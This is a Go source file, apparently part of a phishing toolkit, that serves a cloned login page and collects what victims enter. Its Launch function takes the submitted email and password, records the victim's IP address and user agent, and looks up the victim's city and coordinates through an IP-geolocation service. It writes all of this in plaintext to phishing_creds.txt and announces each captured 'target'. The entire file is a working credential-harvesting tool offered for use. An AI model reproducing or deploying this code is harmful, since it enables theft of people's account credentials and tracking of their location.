package web

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type IPDetails struct {
	Query      string  `json:"query"`
	Country    string  `json:"country"`
	RegionName string  `json:"regionName"`
	City       string  `json:"city"`
	Lat        float64 `json:"lat"`
	Lon        float64 `json:"lon"`
	ISP        string  `json:"isp"`
	Org        string  `json:"org"`
}

// Retrieve IP-based geolocation info
func getIPInfo(ip string) (*IPDetails, error) {
	resp, err := http.Get("https://ip-api.com/json/" + ip)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var data IPDetails
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return nil, err
	}
	return &data, nil
}

// Launch serves the phishing site and logs creds + device + location info
func Launch(templateName string, port int) {
	templatePath := filepath.Join("modules", "phish", "web", "templates", templateName)
	indexFile := filepath.Join(templatePath, "index.html")

	if _, err := os.Stat(indexFile); os.IsNotExist(err) {
		fmt.Printf("[!] Template '%s' not found.\n", templateName)
		return
	}

	// Serve static assets like CSS/images
	fs := http.FileServer(http.Dir(templatePath))
	http.Handle("/"+templateName+"/", http.StripPrefix("/"+templateName+"/", fs))

	// Serve phishing page
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		tmpl, err := template.ParseFiles(indexFile)
		if err != nil {
			http.Error(w, "Template load error", 500)
			return
		}
		tmpl.Execute(w, nil)
	})

	// Handle login form POST
	http.HandleFunc("/log", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			r.ParseForm()

			email := r.FormValue("email")
			pass := r.FormValue("pass")
			ua := r.UserAgent()

			// Get IP address
			ip := r.Header.Get("X-Forwarded-For")
			if ip == "" {
				ip, _, _ = net.SplitHostPort(r.RemoteAddr)
			}
			ip = strings.TrimSpace(ip)

			// Get IP info
			ipInfo, err := getIPInfo(ip)
			loc := "Unknown"
			if err == nil && ipInfo != nil {
				loc = fmt.Sprintf("%s, %s, %s (Lat: %.4f, Lon: %.4f, ISP: %s)",
					ipInfo.City, ipInfo.RegionName, ipInfo.Country,
					ipInfo.Lat, ipInfo.Lon, ipInfo.ISP)
			}

			// Log format
			logEntry := fmt.Sprintf(`[+] New Hit (%s)
IP: %s
Location: %s
User-Agent: %s
Captured:
  - Email/User: %s
  - Password:   %s

-------------------------------
`, time.Now().Format(time.RFC3339), ip, loc, ua, email, pass)

			// Append to file
			logFile := "phishing_creds.txt"
			f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				io.WriteString(f, logEntry)
			}
			fmt.Printf("found target %s, information captured and stored at phishing_creds.txt", email)
		}
		http.Redirect(w, r, "/", http.StatusSeeOther)
	})

	// Launch server
	fmt.Printf("[+] Serving '%s' template at: http://0.0.0.0:%d\n", templateName, port)
	fmt.Println("[*] Waiting for targets...")

	if err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil); err != nil {
		fmt.Printf("[!] Server error: %s\n", err)
	}
}
